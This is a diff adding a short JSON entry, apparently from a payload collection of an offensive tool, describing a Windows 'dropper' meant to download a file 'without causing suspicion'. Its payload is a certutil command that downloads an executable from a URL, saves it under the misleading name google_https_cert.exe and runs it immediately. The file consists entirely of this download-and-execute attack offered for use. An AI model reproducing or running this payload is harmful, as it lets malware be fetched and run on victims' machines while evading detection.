@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "uses certutil to download a file without causing suspicion",
+      "type": "dropper",
+      "exec": "batch"
+    },
+    "payload": "certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe"
+  }
+}
